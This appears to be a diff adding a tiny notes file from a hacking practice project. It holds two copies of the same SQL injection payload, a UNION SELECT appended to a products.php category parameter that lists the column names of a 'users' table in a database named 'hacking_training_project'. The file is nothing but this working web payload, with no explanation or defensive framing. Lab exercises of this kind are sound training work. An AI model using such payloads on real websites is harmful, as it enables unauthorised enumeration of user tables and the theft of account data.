@@ -1,0 +1,8 @@
+1.products.php?cat=1' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema="hacking_training_project" and table_name="users" --+
+
+
+
+
+
+
+2.products.php?cat=1' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema="hacking_training_project" and table_name="users" --+
